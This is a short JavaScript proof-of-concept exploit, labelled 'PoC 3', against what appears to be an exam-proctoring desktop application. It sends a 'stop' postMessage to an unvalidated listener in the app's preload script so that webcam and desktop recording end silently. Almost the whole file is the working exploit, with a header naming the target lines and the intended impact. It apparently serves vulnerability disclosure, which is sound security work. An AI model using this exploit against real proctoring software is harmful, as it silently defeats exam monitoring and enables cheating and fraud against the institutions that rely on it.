/**
 * PoC 3: Silent Proctoring Kill via postMessage
 * Target: preload.js (lines 101-122)
 * Impact: Sends stop action to unvalidated message listener to kill webcam and desktop recording feeds.
 */

(function() {
    console.log("[PoC 3] Sending stop signal to preload listener...");
    window.postMessage({ msg: "stop", Action: "stop" }, "*");
    console.log("[PoC 3] Signal dispatched. Recording streams terminated silently.");
})();
